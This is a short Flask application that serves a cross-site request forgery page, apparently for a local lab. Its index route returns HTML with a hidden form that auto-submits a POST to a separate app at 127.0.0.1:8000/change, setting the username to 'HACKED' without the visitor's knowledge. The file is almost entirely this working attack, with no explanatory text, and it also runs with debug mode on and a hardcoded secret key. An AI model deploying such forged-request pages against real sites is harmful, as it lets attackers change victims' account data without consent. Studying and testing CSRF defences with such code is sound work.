from flask import Flask, session, escape, request, url_for, redirect

app = Flask(__name__)
app.secret_key = b'_5#y1L"F4Q8r\n\xec]/'


@app.route('/')
def index():
    return """
    <form
        action="http://127.0.0.1:8000/change"
        method='POST'
        id="csrf_form">
    <input type='hidden' name='username' value="HACKED">
    </form>
    <script>document.getElementById('csrf_form').submit()</script>
    """

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8001, debug=True)
